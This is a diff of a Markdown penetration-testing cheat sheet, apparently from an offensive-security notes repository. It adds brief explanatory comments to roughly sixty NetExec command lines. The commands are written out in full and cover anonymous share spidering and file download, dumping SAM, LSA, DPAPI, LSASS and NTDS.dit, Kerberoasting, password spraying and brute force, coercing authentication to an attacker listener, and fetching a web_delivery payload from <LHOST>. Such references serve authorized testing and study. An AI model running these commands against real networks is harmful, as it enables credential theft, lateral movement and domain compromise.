@@ -3332,74 +3332,74 @@ dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 #### NetExec
 
 ```c
-netexec smb <RHOST> -u '' -p '' --shares
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
-netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
-netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
-netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
-netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}' 
-netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
-netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER"
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
-netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
-netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
-netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
-netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
-netexec ldap <RHOST> -u '' -p '' -M -user-desc
-netexec ldap <RHOST> -u '' -p '' -M get-desc-users
-netexec ldap <RHOST> -u '' -p '' -M ldap-checker
-netexec ldap <RHOST> -u '' -p '' -M veeam
-netexec ldap <RHOST> -u '' -p '' -M maq
-netexec ldap <RHOST> -u '' -p '' -M adcs
-netexec ldap <RHOST> -u '' -p '' -M zerologon
-netexec ldap <RHOST> -u '' -p '' -M petitpotam
-netexec ldap <RHOST> -u '' -p '' -M nopac
-netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
-netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
-netexec winrm <NETWORK>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
-netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
-netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
-netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
+netexec smb <RHOST> -u '' -p '' --shares                                         // List SMB shares as anonymous
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus                          // List shares & spider files
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false       // Spider shares, allow write
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true    // Spider & download files
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999 // Spider & download large files
+netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE>         // Download specific file from share
+netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute                        // RID brute force user enumeration
+netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000                 // RID brute with custom max
+netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}' // Extract usernames from RID brute
+netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users                         // List users with Kerberos ticket
+netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam                           // Dump SAM hashes with Kerberos ticket
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares                     // List shares with credentials
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir       // List directory in share
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER" // List specific folder
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam                        // Dump SAM hashes
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa                        // Dump LSA secrets
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi                      // Dump DPAPI secrets
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam           // Local SAM dump
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa           // Local LSA dump
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi         // Local DPAPI dump
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av                   // Enumerate antivirus
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc                       // WinRM command check
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped                   // Enumerate snippets
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy                    // Dump LSASS
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE> // Web delivery payload
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin             // Group Policy Preferences autologin
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password              // GPP password extraction
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history        // PowerShell history extraction
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST> // Coerce authentication
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds                       // Dump NTDS.dit
+netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds                       // Dump NTDS.dit with hash
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>     // Dump NTDS for user
+netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>     // Dump NTDS for user with hash
+netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"                      // Exec command with hash
+netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>                         // Generate relay list
+netexec ldap <RHOST> -u '' -p '' -M -user-desc                                   // Enumerate user descriptions
+netexec ldap <RHOST> -u '' -p '' -M get-desc-users                               // Get users with descriptions
+netexec ldap <RHOST> -u '' -p '' -M ldap-checker                                 // LDAP checker module
+netexec ldap <RHOST> -u '' -p '' -M veeam                                        // Veeam module
+netexec ldap <RHOST> -u '' -p '' -M maq                                          // MachineAccountQuota module
+netexec ldap <RHOST> -u '' -p '' -M adcs                                         // ADCS module
+netexec ldap <RHOST> -u '' -p '' -M zerologon                                    // Zerologon check
+netexec ldap <RHOST> -u '' -p '' -M petitpotam                                   // PetitPotam check
+netexec ldap <RHOST> -u '' -p '' -M nopac                                        // NoPAC check
+netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami                          // Whoami with Kerberos ticket
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting // Kerberoast hashes
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast // AS-REP roast hashes
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa                      // Enumerate GMSA accounts
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k                   // GMSA with Kerberos
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>      // Convert GMSA ID
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT> // Decrypt GMSA LSA
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation           // Find delegation
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true  // Get full network info
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All // Bloodhound collection
+netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All // Bloodhound with Kerberos
+netexec winrm <NETWORK>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .                  // WinRM spray
+netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>                        // WinRM with domain
+netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> // WinRM brute
+netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding // WinRM brute ignore pw decoding
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success // No brute, continue on success
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares // List shares (generic)
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue // List shares, continue on success
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol // Password policy
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers // List users
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam // Dump SAM
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable // Enable WDigest
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser' // Exec quser
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec // Exec net user via smbexec
 ```
 
 #### pypykatz
